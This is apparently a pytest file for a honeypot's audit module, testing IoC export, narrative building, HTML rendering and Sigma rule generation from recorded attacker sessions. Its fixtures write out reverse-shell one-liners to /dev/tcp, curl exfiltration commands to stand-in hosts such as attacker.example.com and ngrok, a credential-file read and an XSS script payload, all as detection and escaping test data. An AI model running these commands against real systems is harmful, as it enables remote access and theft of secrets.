"""Unit tests for tools/audit.py — IoC export, summary narrative, html, csv."""
import importlib.util
import json
import sys
from pathlib import Path

import pytest

# Load audit.py as a module
_ROOT = Path(__file__).resolve().parent.parent
_spec = importlib.util.spec_from_file_location("audit_mod", _ROOT / "tools" / "audit.py")
audit = importlib.util.module_from_spec(_spec)
_spec.loader.exec_module(audit)


def _make_engagement(eid="abc12345-...", user="jdoe", ip="127.0.0.1",
                     observed=None, alerts=None, vfs=None,
                     commands=None):
    """Build an engagement dict in the shape `load_engagements` would return."""
    import time
    obs = {
        "ran_sudo": False, "services_probed": [], "attempted_lateral": False,
        "found_crown_jewel": False, "isolated": False,
        "credential_files_read": [], "honeytoken_modifications": [],
        "honeytoken_deletions": [], "payload_drops": [],
        "ssh_persistence_attempt": False, "bash_history_inspected": False,
        "credential_search_attempted": False, "credential_search_terms": [],
        "reverse_shell_attempted": False, "reverse_shell_command": "",
        "dns_exfil_attempted": False, "dns_exfil_commands": [],
        "lateral_to_decoy": False, "decoy_targets": [],
        "log_tampering": False, "tampering_commands": [],
        "attempted_sudo_elevation": False,
        "decoys_planted": [], "decoys_swallowed": [],
    }
    if observed:
        obs.update(observed)
    log = {
        "id": "fake-log",
        "engagement_id": eid,
        "started_at": time.time() - 60,
        "actions_taken": alerts or [],
        "commands": commands or [],
        "connection_count": 1,
    }
    return {
        "engagement_id": eid,
        "claimed_user": user,
        "source_ip": ip,
        "first_seen_at": time.time() - 60,
        "last_seen_at": time.time(),
        "connection_count": 1,
        "cwd": f"/home/{user}",
        "vfs": vfs or {"files": {}, "deleted": []},
        "observed": obs,
        "logs": [log],
        "personas_dir": _ROOT / "personas",
    }


class TestIoCExport:
    def test_basic_structure(self):
        eng = _make_engagement()
        out = json.loads(audit.export_ioc(eng))
        assert out["engagement_id"] == eng["engagement_id"]
        assert out["claimed_user"] == "jdoe"
        assert "alerts" in out
        assert "c2_endpoints" in out
        assert "exfil_domains" in out

    def test_c2_extraction_from_revshell(self):
        eng = _make_engagement(observed={
            "reverse_shell_attempted": True,
            "reverse_shell_command": "bash -i >& /dev/tcp/198.51.100.7/4444 0>&1",
        })
        out = json.loads(audit.export_ioc(eng))
        assert any(c["ip"] == "198.51.100.7" and c["port"] == 4444 for c in out["c2_endpoints"])

    def test_exfil_domain_extraction(self):
        eng = _make_engagement(observed={
            "dns_exfil_attempted": True,
            "dns_exfil_commands": ["curl https://attacker.example.com/exfil", "curl https://x.ngrok.io/$(whoami)"],
        })
        out = json.loads(audit.export_ioc(eng))
        hosts = {d["host"] for d in out["exfil_domains"]}
        assert "attacker.example.com" in hosts
        assert "x.ngrok.io" in hosts

    def test_alerts_sorted_by_severity(self):
        eng = _make_engagement(alerts=[
            {"action": "alert_credential_exfil", "severity": "high", "triggered_by": "cat ~/.aws/credentials", "ts_offset_s": 5},
            {"action": "alert_reverse_shell", "severity": "critical", "triggered_by": "bash -i", "ts_offset_s": 10},
            {"action": "plant_sudo_vulnerability", "severity": "info", "triggered_by": "sudo -l", "ts_offset_s": 1},
        ])
        out = json.loads(audit.export_ioc(eng))
        names = [a["name"] for a in out["alerts"]]
        assert names == ["alert_reverse_shell", "alert_credential_exfil", "plant_sudo_vulnerability"]

    def test_csv_format(self):
        eng = _make_engagement(observed={
            "reverse_shell_attempted": True,
            "reverse_shell_command": "bash -i >& /dev/tcp/1.2.3.4/9999 0>&1",
            "dns_exfil_attempted": True,
            "dns_exfil_commands": ["curl https://x.ngrok.io/exfil"],
            "decoy_targets": ["db-prod-01"],
            "credential_files_read": ["/home/jdoe/.aws/credentials"],
        })
        csv = audit.export_ioc(eng, as_csv=True)
        assert "type,value,severity" in csv  # header
        assert "c2_ip,1.2.3.4:9999,critical" in csv
        assert "exfil_domain,x.ngrok.io,high" in csv
        assert "lateral_target,db-prod-01,high" in csv


class TestNarrativeBuilder:
    def test_idle_engagement_says_idle(self):
        eng = _make_engagement()
        out = audit.build_narrative(eng)
        assert "[info]" in out.lower() or "idle" in out.lower()

    def test_critical_renders_crit_badge(self):
        eng = _make_engagement(alerts=[{
            "action": "alert_reverse_shell", "severity": "critical",
            "triggered_by": "bash -i >& /dev/tcp/1.2.3.4/9000 0>&1", "ts_offset_s": 1,
        }], observed={
            "reverse_shell_attempted": True,
            "reverse_shell_command": "bash -i >& /dev/tcp/1.2.3.4/9000 0>&1",
        })
        out = audit.build_narrative(eng)
        assert "CRIT" in out
        assert "1.2.3.4:9000" in out

    def test_exfil_domain_extracted_into_narrative(self):
        eng = _make_engagement(alerts=[{
            "action": "alert_dns_exfil", "severity": "high",
            "triggered_by": "curl https://x.ngrok.io/exfil", "ts_offset_s": 1,
        }], observed={
            "dns_exfil_attempted": True,
            "dns_exfil_commands": ["curl https://x.ngrok.io/exfil"],
        })
        out = audit.build_narrative(eng)
        assert "exfil" in out
        assert "ngrok.io" in out


class TestHTMLReport:
    def test_renders_valid_html(self):
        eng = _make_engagement()
        html = audit.render_html(eng)
        assert html.startswith("<!doctype html>")
        assert "</html>" in html
        assert eng["engagement_id"] in html

    def test_no_xss_via_command_text(self):
        eng = _make_engagement(alerts=[{
            "action": "alert_dns_exfil", "severity": "high",
            "triggered_by": '<script>alert("xss")</script>', "ts_offset_s": 1,
        }])
        html = audit.render_html(eng)
        # The literal `<script>` must NOT be present unescaped
        assert "<script>alert" not in html
        assert "&lt;script&gt;" in html

    def test_alert_count_matches(self):
        eng = _make_engagement(alerts=[
            {"action": "alert_credential_exfil", "severity": "high", "triggered_by": "cat", "ts_offset_s": 1},
            {"action": "alert_reverse_shell", "severity": "critical", "triggered_by": "bash", "ts_offset_s": 2},
        ])
        html = audit.render_html(eng)
        assert "Alerts (2)" in html


class TestSigmaExport:
    def test_yaml_parses(self):
        import yaml
        eng = _make_engagement(alerts=[
            {"action": "alert_reverse_shell", "severity": "critical",
             "triggered_by": "bash -i >& /dev/tcp/1.2.3.4/4444 0>&1", "ts_offset_s": 1},
        ], observed={
            "reverse_shell_attempted": True,
            "reverse_shell_command": "bash -i >& /dev/tcp/1.2.3.4/4444 0>&1",
        })
        sigma_text = audit.render_sigma(eng)
        # Parse each YAML document; skip the header comment
        body = sigma_text.split("\n", 1)[1]
        docs = list(yaml.safe_load_all(body))
        assert len(docs) >= 1
        for d in docs:
            if d is None:
                continue
            # Sigma required fields
            assert "title" in d
            assert "id" in d
            assert "detection" in d
            assert "level" in d

    def test_id_is_deterministic_per_engagement_action(self):
        eng = _make_engagement(eid="aaa11111-...", alerts=[
            {"action": "alert_reverse_shell", "severity": "critical",
             "triggered_by": "bash", "ts_offset_s": 1},
        ])
        a = audit.render_sigma(eng)
        b = audit.render_sigma(eng)
        assert a == b  # determinism

    def test_c2_ip_in_emitted_detection(self):
        eng = _make_engagement(alerts=[
            {"action": "alert_reverse_shell", "severity": "critical",
             "triggered_by": "bash", "ts_offset_s": 1},
        ], observed={
            "reverse_shell_attempted": True,
            "reverse_shell_command": "bash -i >& /dev/tcp/9.9.9.9/8888 0>&1",
        })
        sigma_text = audit.render_sigma(eng)
        assert "9.9.9.9" in sigma_text
        assert "8888" in sigma_text

    def test_exfil_domain_in_emitted_detection(self):
        eng = _make_engagement(alerts=[
            {"action": "alert_dns_exfil", "severity": "high",
             "triggered_by": "curl https://evil.example.com/x", "ts_offset_s": 1},
        ], observed={
            "dns_exfil_attempted": True,
            "dns_exfil_commands": ["curl https://evil.example.com/x"],
        })
        sigma_text = audit.render_sigma(eng)
        assert "evil.example.com" in sigma_text

    def test_no_alerts_returns_header_only(self):
        eng = _make_engagement()  # no alerts
        out = audit.render_sigma(eng)
        assert "no alerts" in out.lower() or "experimental" not in out


class TestDurationParsing:
    def test_parses_units(self):
        assert audit._parse_duration("60s") == 60
        assert audit._parse_duration("5m") == 300
        assert audit._parse_duration("2h") == 7200
        assert audit._parse_duration("1d") == 86400
        assert audit._parse_duration("1w") == 604800

    def test_bare_number_is_seconds(self):
        assert audit._parse_duration("90") == 90

    def test_invalid_returns_none(self):
        assert audit._parse_duration("xyz") is None
